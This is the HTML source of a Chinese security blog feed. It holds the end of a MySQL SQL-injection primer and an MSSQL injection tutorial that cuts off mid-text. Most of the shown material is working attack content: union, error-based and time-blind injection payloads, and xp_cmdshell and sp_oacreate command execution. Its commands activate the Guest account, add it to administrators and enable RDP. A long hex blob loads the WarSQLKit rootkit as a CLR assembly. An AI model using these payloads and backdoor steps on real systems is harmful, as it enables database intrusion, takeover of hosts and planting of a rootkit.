rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+----------+--------+</span><br><span class="line">| id | username | passwd |</span><br><span class="line">+----+----------+--------+</span><br><span class="line">|  1 | khaz3    | passwd |</span><br><span class="line">|  2 | khaz2    | 1234   |</span><br><span class="line">+----+----------+--------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="对用户的增删查改"><a href="#对用户的增删查改" class="headerlink" title="对用户的增删查改"></a>对用户的增删查改</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">增  insert into users(username,password)  values(&#x27;khaz&#x27;,&#x27;wuhu&#x27;)</span><br><span class="line">create user &#x27;用户名&#x27;@&#x27;来源地址&#x27; identified by &#x27;密码&#x27;</span><br><span class="line">删  drop user 用户名</span><br><span class="line">查  select user()</span><br><span class="line">改  修改用户名 rename user 旧用户名 to 新用户名</span><br><span class="line">修改密码 SET PASSWORD FOR 用户名 = PASSWORD(&#x27;abc123&#x27;);</span><br></pre></td></tr></table></figure><h2 id="sql注入相关解释"><a href="#sql注入相关解释" class="headerlink" title="sql注入相关解释"></a>sql注入相关解释</h2><h3 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h3><p>order  by语句用于根据指定的列对结果集进行排序，支持字段名和字段位置</p><p><img src="/../images/image-20230329231709625-1687276382008.png" alt="image-20230329231709625"></p><p>可选参数(排列方式): </p><ul><li>升序(ASC) 默认</li><li>降序(DESC)</li></ul><p><strong>在sql注入中的使用：</strong></p><blockquote><p>判断字段数：当字段位置不存在时就会报错</p><p>order by注入</p></blockquote><h3 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h3><p>用于分页</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="operator">*</span> <span class="keyword">from</span> article LIMIT <span class="number">1</span>,<span class="number">3</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> article LIMIT <span class="number">3</span> <span class="keyword">OFFSET</span> <span class="number">1</span></span><br><span class="line">上面两种写法都表示取 <span class="number">2</span>、<span class="number">3</span>、<span class="number">4</span> 三条条数据：</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>当 LIMIT 后面跟两个参数的时候，第一个数表示要跳过的数量，后一位表示要取的数量</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>当 LIMIT 和 <span class="keyword">OFFSET</span> 组合使用的时候，LIMIT 后面只能有一个参数，表示要取的的数量，<span class="keyword">OFFSET</span>表示要跳过的数量 。</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span><span class="operator">*</span> <span class="keyword">from</span> article LIMIT <span class="number">3</span> </span><br><span class="line">表示取前三条数据</span><br><span class="line">当 LIMIT 后面跟一个参数的时候，该参数表示要取的数据的数量。</span><br></pre></td></tr></table></figure><p><strong>在注入中的使用：</strong></p><blockquote><p>使用group_concat()批量查询输出结果长度有限制，需要使用linmit一条一条获取或使用concat()拼接得到结果<br>limit 0,1<br>limit 1,1<br>limit 2,1<br>….</p></blockquote><h3 id="union-select与select"><a href="#union-select与select" class="headerlink" title="union select与select"></a>union select与select</h3><p>union select语句用来合并两个或多个 SELECT 语句的结果集。所以union select可以用来查询其他表。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 字段值1 from 表1 union select 字段值2 from 表2</span><br></pre></td></tr></table></figure><h4 id="union特性"><a href="#union特性" class="headerlink" title="union特性"></a>union特性</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span><span class="keyword">union</span>  <span class="keyword">select</span>只能查询两个表中共同都有的字段，如果一个字段在另外一个表中没有，就会报错</span><br><span class="line"></span><br><span class="line">如users表比users2表多了school字段，查询users表中的school和users2表中的address，因为users2表中没有school字段，所以报错</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">2.</span>(<span class="keyword">union</span>) <span class="keyword">select</span> 查询的字段数要一致，否则会报错</span><br><span class="line">所以需要先用<span class="keyword">order</span> <span class="keyword">by</span>来判断字段数</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.union 自带去重功能（distinct的功能）</span><br><span class="line"></span><br><span class="line">如果不想要去重可以使用union all</span><br></pre></td></tr></table></figure><h4 id="select-1-2-3"><a href="#select-1-2-3" class="headerlink" title="select 1,2,3"></a>select 1,2,3</h4><p> select时不写后面的表名，这时select实际上没有向任何一个数据库查询数据，即查询命令不指向任何数据库的表。返回值就是我们输入的这个数组。</p><p><img src="/../images/image-20230522123755808-1687276382008.png" alt="image-20230522123755808"></p><p>通过这个和union select</p><h5 id="构造临时数据"><a href="#构造临时数据" class="headerlink" title="构造临时数据"></a>构造临时数据</h5><p><img src="/../images/image-20230522124110552-1687276382007.png" alt="image-20230522124110552"></p><p>users表中并没有要查询的数据,但是却返回了我们构造的数据!</p><p><img src="/../images/image-20230522124150917-1687276382008.png" alt="image-20230522124150917"></p><p>而在下一次查询中，这个我们自定义的数据不存在，说明通过这样方式创建的数据的存活周期只在其查询语句执行时</p><p>所以通过上述操作就可以临时构造一个用户，达到登录的效果</p><h5 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h5><p><strong>需要将前面的select语句设置为假</strong>，才能使用后面的union select 1,2,3来判断哪一个字段值是回显的，是可以利用的。（原因是一般获取的是第一个结果，而我们构造的union select 1,2,3在之后）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,2,3</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522124339221-1687276382008.png" alt="image-20230522124339221"></p><h5 id="select-XX和表名"><a href="#select-XX和表名" class="headerlink" title="select+XX和表名"></a>select+XX和表名</h5><p>列数取决于我们输入的数字个数，行数取决于表原来的行数。</p><p><img src="/../images/image-20230522124413676-1687276382008.png" alt="image-20230522124413676"></p><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><img src="E:\typora img\image-20230406175143769.png" alt="image-20230406175143769" style="zoom:150%;" /><ul><li><p>单行注释符</p><ul><li><p>–+</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">实质上--是起到注释的作用，但是在sql中用--注释后面必须加一个空格--才生效</span><br></pre></td></tr></table></figure></li><li><h1 id=""><a href="#" class="headerlink" title=""></a></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在URL中#表示锚点，带上#不会请求后端路由，而是刷新前端路由，所以</span><br><span class="line">测试一般用URL编码后的%23</span><br></pre></td></tr></table></figure></li></ul></li><li><p>多行注释符</p><ul><li><p>&#x2F;*   *&#x2F;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用于注释多行</span><br><span class="line">/*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   */</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="and-与-or"><a href="#and-与-or" class="headerlink" title="and 与 or"></a>and 与 or</h3><p><img src="/../images/image-20230522124632240-1687276382008.png" alt="image-20230522124632240"></p><h3 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h3><p>反引号是 mysql 的转义符，只要你不在列名、表名中使用 mysql 的保留字或中文，就不需要转义。<br>其他数据库也同样有保留字，如果使用的话也同样需要转义，只是转义符不同而已。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#假如表A中有一列名为<span class="keyword">select</span>，查询该列</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">select</span> <span class="keyword">from</span> A;   #错误</span><br><span class="line"><span class="keyword">select</span> `<span class="keyword">select</span>` <span class="keyword">from</span> A;  #正确</span><br><span class="line"></span><br><span class="line">#假如存在表flag，用<span class="keyword">desc</span>(<span class="keyword">describe</span>)查询该表信息</span><br><span class="line"><span class="keyword">desc</span> flag A;  #显示flag表信息，别名为A</span><br><span class="line"><span class="keyword">desc</span> `flag` `A` #与上述语句相同</span><br></pre></td></tr></table></figure><p>MySQL 关键字和保留字汇总（MySQL 8.0）：</p><p><a href="https://blog.csdn.net/m0_56921622/article/details/122975904">https://blog.csdn.net/m0_56921622/article/details/122975904</a></p><h3 id="as"><a href="#as" class="headerlink" title="as"></a>as</h3><p><code>AS</code>命令用于使用别名重命名列或表。</p><p>别名仅在查询期间存在。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">重命名表名</span><br><span class="line"><span class="keyword">select</span> c.ID <span class="keyword">from</span> users <span class="keyword">as</span> c</span><br><span class="line">重命名列名</span><br><span class="line"><span class="keyword">select</span> c.ID <span class="keyword">as</span> ID2 <span class="keyword">from</span> users <span class="keyword">as</span> c</span><br><span class="line"></span><br><span class="line">注：可以把<span class="keyword">as</span>省略，即<span class="keyword">select</span> c.ID <span class="keyword">from</span> users c等价于<span class="keyword">select</span> c.ID <span class="keyword">from</span> users <span class="keyword">as</span> c</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220701112525082-1687276382008.png" alt="image-20220701112525082"></p><p>在sql注入可以用于无列名注入</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Sql注入--MSSQL</title>
      <link href="/2023/05/01/Web%E5%AE%89%E5%85%A8%E4%B9%8BSqlserver%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/01/Web%E5%AE%89%E5%85%A8%E4%B9%8BSqlserver%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul><li><p>cn_windows_server_2008_r2_standard_enterprise_datacenter_and_web_with_sp1_x64_dvd_617598.iso</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">补丁：kb4474419 # 打了才能装vmtools</span><br><span class="line"></span><br><span class="line">服务器管理器添加角色IIS</span><br><span class="line">记得勾选.net开发</span><br><span class="line">IIS管理器添加网站，开启父路径</span><br></pre></td></tr></table></figure></li><li><p>Sqlserver  2008</p><p><a href="https://download.microsoft.com/download/9/4/8/948966AB-52CA-40F1-8051-0216481065E6/SQLEXPR_x64_CHS.exe">https://download.microsoft.com/download/9/4/8/948966AB-52CA-40F1-8051-0216481065E6/SQLEXPR_x64_CHS.exe</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密码：SA123@</span><br><span class="line"></span><br><span class="line">C:\Windows\SysWOW64\SQLServerManager10</span><br><span class="line">开启TCP/IP</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516132937292-1697520279847.png" alt="image-20230516132937292"></p></li><li><p><a href="https://github.com/Larryxi/MSSQL-SQLi-Labs">https://github.com/Larryxi/MSSQL-SQLi-Labs</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">创建数据库test</span><br><span class="line">修改数据库配置文件</span><br></pre></td></tr></table></figure></li></ul><h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="系统数据库"><a href="#系统数据库" class="headerlink" title="系统数据库"></a>系统数据库</h2><ul><li><code>master</code> ：master数据库控制SQL Server的所有方面。这个数据库中包括所有的配置信息、用户登录信息、当前正在服务器中运行的过程的信息。</li><li><code>model</code>：SQL Server为用户数据库提供的样板，新的用户数据库都以model数据库为基础</li><li><code>msdb</code>   ：由 Enterprise Manager和Agent使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息。</li><li><code>tempdb</code>  ：它为临时表和其他临时工作提供了一个存储区。例如，排序时要用到tempdb数据库。数据被放进tempdb数据库，排完序后再把结果返回给用户。每次SQL Server重新启动，它都会清空tempdb数据库并重建。永远不要在tempdb数据库建立需要永久保存的表。</li></ul><h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><ul><li><code>sa（SysAdmin）</code>权限：数据库操作，文件管理，命令执行，注册表读取等system。SQLServer数据库的最高权限</li><li><code>db（Database_owner）</code>权限：文件管理，数据库操作等权限 users-administrators</li><li><code>public</code>权限：数据库操作 guest-users</li></ul><h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">/**/</span></span><br></pre></td></tr></table></figure><h2 id="变量和函数"><a href="#变量和函数" class="headerlink" title="变量和函数"></a>变量和函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@@VERSION</span><br><span class="line">@@servername  -- 服务器名</span><br><span class="line">host_name() -- 主机名</span><br><span class="line"></span><br><span class="line">-- 判断站库分离</span><br><span class="line">host_name()==@@servername</span><br><span class="line"></span><br><span class="line">db_name()  -- 当前数据库</span><br><span class="line">db_name(num) -- 遍历其他数据库</span><br><span class="line"></span><br><span class="line">user</span><br><span class="line">user_name()</span><br><span class="line"></span><br><span class="line">is_srvrolemember(&#x27;sysadmin&#x27;)     -- 判断是否是SA权限</span><br><span class="line">is_member(&#x27;db_owner&#x27;)  -- 判断是否是db_owner权限</span><br><span class="line">is_srvrolemember(&#x27;public&#x27;) -- 判断是否是public权限</span><br></pre></td></tr></table></figure><h2 id="数据表"><a href="#数据表" class="headerlink" title="数据表"></a>数据表</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">master..sysdatabases -- 存放所有数据库</span><br><span class="line">master..sysobjects --  存放所有数据表</span><br><span class="line"></span><br><span class="line">-- 字段名为name</span><br><span class="line"></span><br><span class="line">select name from master..sysobjects where xtype=&#x27;U&#x27; -- 查询用户自建表</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[dbname].information_schema.columns  -- db的所有字段</span><br><span class="line"></span><br><span class="line">字段名table_name,column_name</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[dbname].information_schema.tables  -- db的所有表</span><br><span class="line"></span><br><span class="line">字段名table_name</span><br></pre></td></tr></table></figure><h2 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h2><table><thead><tr><th align="center">SqlServer(mssql)</th><th align="center">Mysql</th></tr></thead><tbody><tr><td align="center">select top 1 name from users</td><td align="center">select  name from users limit 0,1</td></tr></tbody></table><h1 id="注入手段"><a href="#注入手段" class="headerlink" title="注入手段"></a>注入手段</h1><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><blockquote><p>利用显示或隐式转换来报错注入</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from admin where id =1 (select CAST(USER as int))</span><br><span class="line"></span><br><span class="line">select * from admin where id =1 (select convert(int,user))</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230515211249595-1697520285581.png" alt="image-20230515211249595"></p><h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><ul><li><p>判断字段</p><p><img src="/../images/image-20230515174430619-1697520287732.png" alt="image-20230515174430619"></p></li><li><p>查找回显</p><p><img src="/../images/image-20230515174542376-1697520288977.png" alt="image-20230515174542376"></p></li><li><p>爆库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,db_name(num)--</span><br></pre></td></tr></table></figure></li><li><p>爆表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select top 1 1,2,name from [dbname]..sysobjects where xtype=&#x27;u&#x27; --</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select top 1 1,2,name from [dbname]..sysobjects where xtype=&#x27;u&#x27; and name!=&#x27;[第一条获得的表名]&#x27; --</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select top 1 1,2,name from [dbname]..sysobjects where xtype=&#x27;u&#x27; and name not in ([前面的表]) --</span><br></pre></td></tr></table></figure></li><li><p>爆字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select  top 1  1,2, COLUMN_NAME from test.information_schema.columns where TABLE_NAME=&#x27;users&#x27; --</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select  top 1  1,2, COLUMN_NAME from test.information_schema.columns where TABLE_NAME=&#x27;users&#x27; and COLUMN_NAME and COLUMN_NAME!=&#x27;id&#x27; --</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select  top 1  1,2, COLUMN_NAME from test.information_schema.columns where TABLE_NAME=&#x27;users&#x27; and COLUMN_NAME not in (&#x27;id&#x27;,&#x27;username&#x27;) --</span><br></pre></td></tr></table></figure><ul><li>爆字段值</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select  top 1  1,2, COLUMN_NAME from &#x27;users&#x27; --</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select  top 1 1,2,username from users where username!=&#x27;Dumb&#x27;--</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select  top 1 1,2,username from users where username not in (&#x27;Dumb&#x27;,&#x27;Angelina&#x27;)--</span><br></pre></td></tr></table></figure></li></ul><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>默认开启</p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(xxx) waitfor delay &#x27;0:0:2&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>0:0:2</p><p>小时:分钟:秒</p></blockquote><h1 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h1><h2 id="绝对路径🔍"><a href="#绝对路径🔍" class="headerlink" title="绝对路径🔍"></a>绝对路径🔍</h2><blockquote><p><code>xp_dirtree</code> 是一个存储过程（stored procedure），它是 Microsoft SQL Server 数据库引擎提供的一个内置过程。该过程可用于执行文件系统目录树扫描操作。</p><p>使用 <code>xp_dirtree</code> 存储过程，可以指定一个文件路径，然后执行递归扫描该路径下的所有文件和文件夹，并将结果以表格形式返回给用户</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execute master..xp_dirtree &#x27;c:&#x27; //列出所有c:\文件和目录,子目录 </span><br><span class="line">execute master..xp_dirtree &#x27;c:&#x27;,1 //只列c:\文件夹 </span><br><span class="line">execute master..xp_dirtree &#x27;c:&#x27;,1,1 //列c:\文件夹加文件 </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE tmp (dir varchar(8000),num int,num1 int);</span><br><span class="line"></span><br><span class="line">insert into tmp(dir,num,num1) execute master..xp_dirtree &#x27;c:&#x27;,1,1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE cmdtmp (dir varchar(8000));</span><br><span class="line"></span><br><span class="line">insert into cmdtmp(dir) exec master..xp_cmdshell &#x27;for /r c:\ %i in (1*.aspx) do @echo %i&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../../../../../blog/source/images/image-20230515213216038-1694613900373.png" alt="image-20230515213216038"></p><h2 id="SA权限"><a href="#SA权限" class="headerlink" title="SA权限"></a>SA权限</h2><h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><ul><li><p>是否开启</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*) FROM master..sysobjects Where xtype = &#x27;X&#x27; AND name = &#x27;xp_cmdshell&#x27; </span><br><span class="line"></span><br><span class="line">返回值为1 → 开启</span><br></pre></td></tr></table></figure></li><li><p>强制开启</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 将该选项的值设置为1</span><br><span class="line">execute(&#x27;sp_configure &quot;show advanced options&quot;,1&#x27;)  </span><br><span class="line">-- 保存设置</span><br><span class="line">execute(&#x27;reconfigure&#x27;) </span><br><span class="line">-- 将xp_cmdshell的值设置为1</span><br><span class="line">execute(&#x27;sp_configure &quot;xp_cmdshell&quot;, 1&#x27;) </span><br><span class="line">-- 保存设置</span><br><span class="line">execute(&#x27;reconfigure&#x27;)                             </span><br></pre></td></tr></table></figure></li><li><p>恢复被删除的<code>xp_cmdshell</code></p><p>下载：<a href="https://cn.dll-files.com/xplog70.dll.html">https://cn.dll-files.com/xplog70.dll.html</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Exec master.dbo.sp_addextendedproc &#x27;xp_cmdshell&#x27;,&#x27;D:\\xplog70.dll&#x27;</span><br></pre></td></tr></table></figure></li><li><p>命令执行–有回显（返回命令结果）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execute(&#x27;xp_cmdshell &quot;whoami&quot;&#x27;) </span><br></pre></td></tr></table></figure></li><li><p>获得主机权限</p><blockquote><p>版本问题？？</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec xp_cmdshell &#x27;net user Guest 123456&#x27;              --给guest用户设置密码</span><br><span class="line">exec xp_cmdshell &#x27;net user Guest /active:yes&#x27;         --激活guest用户</span><br><span class="line">exec xp_cmdshell &#x27;net localgroup administrators Guest /add&#x27;  --将guest用户添加到administrators用户组</span><br><span class="line">exec xp_cmdshell &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;        --开启3389端口</span><br></pre></td></tr></table></figure></li></ul><h3 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h3><ul><li><p>是否开启</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;SP_OACREATE&#x27;</span><br><span class="line"></span><br><span class="line">返回值为1 → 开启</span><br></pre></td></tr></table></figure></li><li><p>强制开启</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;  </span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;  </span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br></pre></td></tr></table></figure></li><li><p>命令执行–无回显（不返回命令结果）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt; e:\\test2.txt&#x27;</span><br></pre></td></tr></table></figure></li></ul><h3 id="CLR功能"><a href="#CLR功能" class="headerlink" title="CLR功能"></a>CLR功能</h3><blockquote><p>CLR（公共语言运行时）提供了 .NET Framework 的代码执行环境，可以通过 .NET Framework 来编写存储过程、触发器等功能 。简单说，通过 CLR 能够在 <a href="https://cloud.tencent.com/product/sqlserver?from=20065&from_column=20065">SQLServer</a> 中注册一套程序集，实现执行任意的 .NET 代码。既然可以执行代码，此时就可以实现很多功能。</p></blockquote><p>使用：<a href="https://github.com/mindspoof/MSSQL-Fileless-Rootkit-WarSQLKit">https://github.com/mindspoof/MSSQL-Fileless-Rootkit-WarSQLKit</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--启用MSSQL CLR功能</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">Exec sp_configure &#x27;clr enabled&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"> </span><br><span class="line">--为了导入了不安全的程序集，我们还需要将数据库标记为安全。</span><br><span class="line">ALTER DATABASE [master] SET TRUSTWORTHY ON;</span><br><span class="line"> </span><br><span class="line">--导入程序集，单独执行</span><br><span class="line">CREATE ASSEMBLY [WarSQLKit] AUTHORIZATION [dbo] FROM 0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000504500004c0103006643f55f0000000000000000e00022200b013000000e00000006000000000000022d0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000b02c00004f00000000400000b803000000000000000000000000000000000000006000000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002e74657874000000080d000000200000000e000000020000000000000000000000000000200000602e72737263000000b8030000004000000004000000100000000000000000000000000000400000402e72656c6f6300000c0000000060000000020000001400000000000000000000000000004000004200000000000000000000000000000000e42c00000000000048000000020005005c220000540a00000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000be280e00000a72010000706f0f00000a280e00000a7243000070725300007002281000000a28020000066f0f00000a2a1b300600a40100000100001173040000060a731100000a0b076f1200000a026f1300000a03281400000a2d0c076f1200000a036f1500000a076f1200000a176f1600000a076f1200000a176f1700000a076f1200000a166f1800000a076f1200000a176f1900000a076f1200000a176f1a00000a06731b00000a7d010000040706fe0605000006731c00000a6f1d00000a140c076f1e00000a26076f1f00000a076f2000000a6f2100000a0c076f2200000ade390d280e00000a1b8d160000012516725d000070a2251702a2251803a225197291000070a2251a096f2300000aa2282400000a6f0f00000ade00076f2500000a2d1a280e00000a067b010000046f2600000a6f0f00000a3895000000731b00000a130408281400000a2d091104086f2700000a26067b010000046f2800000a2c20110472970000706f2700000a261104067b010000046f2600000a6f2700000a26280e00000a1c8d16000001251602a2251703a2251872af000070a22519076f2500000a13051205282900000aa2251a7291000070a2251b1104252d0426142b056f2600000aa2282400000a6f0f00000a067b010000046f2600000a2a011000000000870021a80039100000011e02282a00000a2a4e027b01000004046f2b00000a6f2700000a262a42534a4201000100000000000c00000076322e302e35303732370000000005006c00000038030000237e0000a4030000a804000023537472696e6773000000004c080000e80000002355530034090000100000002347554944000000440900001001000023426c6f620000000000000002000001571502000902000000fa013300160000010000001c000000030000000100000005000000050000002b0000000d000000010000000100000003000000010000000000b1020100000000000600ed01ae0306005a02ae03060038019b030f00ce03000006004c01cd020600d001cd020600b101cd0206004102cd0206000d02cd0206002602cd0206007901cd0206009401cd0206003004c6020a0063014e030e0009049b030600df02c602060020036e0406001d01ae030e00ee039b030a007a044e030a0015014e0306008e02c6020e00f7029b030e00c4009b030e0035039b0306000803360006001503360006002700c602000000002d00000000000100010001001000dd030000350001000100030110000100000035000100040006006404740050200000000096005e007800010080200000000096008b001a00020040220000000086189503060004004022000000008618950306000400482200000000830016007d000400000001007d0000000100e400000002001f04000001002e03000002000404090095030100110095030600190095030a00290095031000310095031000390095031000410095031000490095031000510095031000590095031000610095031000710095030600910095030600a1000c011500a90096001000b10029041a007900950306007900e9022d00b900d7001000b10098043200b90011041000b90085043700b900b4003c00b90078023700b9007b033700b90049043700890095030600c90095034200790066004800790043044e007900ed000600790069035200d900810057007900370406008100a8005700b10029045b0079009b00610069008c025700890001016500890095026100e1008c02570069009503060099004c005700200063000b012e000b0084002e0013008d002e001b00ac002e002300b5002e002b00cb002e003300cb002e003b00cb002e004300d1002e004b00e1002e005300cb002e005b00fe0063006b000b012000048000000100000000000000000000000000a00200000200000000000000000000006b005500000000000200000000000000000000006b004000000000000200000000000000000000006b00c60200000000030002000000003c3e635f5f446973706c6179436c617373315f30003c52756e436f6d6d616e643e625f5f3000496e743332003c4d6f64756c653e0053797374656d2e494f0053797374656d2e44617461006765745f44617461006d73636f726c696200436d6445786563006164645f4f757470757444617461526563656976656400636d640052656164546f456e640052756e436f6d6d616e640053656e64006765745f45786974436f6465006765745f4d657373616765007365745f57696e646f775374796c650050726f6365737357696e646f775374796c65007365745f46696c654e616d650066696c656e616d6500426567696e4f7574707574526561644c696e6500417070656e644c696e65006765745f506970650053716c5069706500436f6d70696c657247656e6572617465644174747269627574650044656275676761626c6541747472696275746500417373656d626c795469746c654174747269627574650053716c50726f63656475726541747472696275746500417373656d626c7954726164656d61726b41747472696275746500417373656d626c7946696c6556657273696f6e41747472696275746500417373656d626c79436f6e66696775726174696f6e41747472696275746500417373656d626c794465736372697074696f6e41747472696275746500436f6d70696c6174696f6e52656c61786174696f6e7341747472696275746500417373656d626c7950726f6475637441747472696275746500417373656d626c79436f7079726967687441747472696275746500417373656d626c79436f6d70616e794174747269627574650052756e74696d65436f6d7061746962696c697479417474726962757465007365745f5573655368656c6c4578656375746500546f537472696e67006765745f4c656e6774680057617253514c4b69744d696e696d616c0057617253514c4b69744d696e696d616c2e646c6c0053797374656d0053797374656d2e5265666c656374696f6e00457863657074696f6e006765745f5374617274496e666f0050726f636573735374617274496e666f0053747265616d526561646572005465787452656164657200537472696e674275696c6465720073656e646572004461746152656365697665644576656e7448616e646c6572004d6963726f736f66742e53716c5365727665722e536572766572006765745f5374616e646172644572726f72007365745f52656469726563745374616e646172644572726f72002e63746f720053797374656d2e446961676e6f73746963730053797374656d2e52756e74696d652e436f6d70696c6572536572766963657300446562756767696e674d6f6465730053746f72656450726f63656475726573004461746152656365697665644576656e744172677300617267730050726f63657373007365745f417267756d656e747300617267756d656e747300436f6e636174004f626a6563740057616974466f7245786974005374617274007365745f52656469726563745374616e646172644f7574707574007374644f75747075740053797374656d2e546578740053716c436f6e74657874007365745f4372656174654e6f57696e646f770049734e756c6c4f72456d707479000000004143006f006d006d0061006e0064002000690073002000720075006e006e0069006e0067002c00200070006c006500610073006500200077006100690074002e00000f63006d0064002e00650078006500000920002f006300200000334f00530020006500720072006f00720020007700680069006c006500200065007800650063007500740069006e006700200000053a002000001753007400640020006f00750074007000750074003a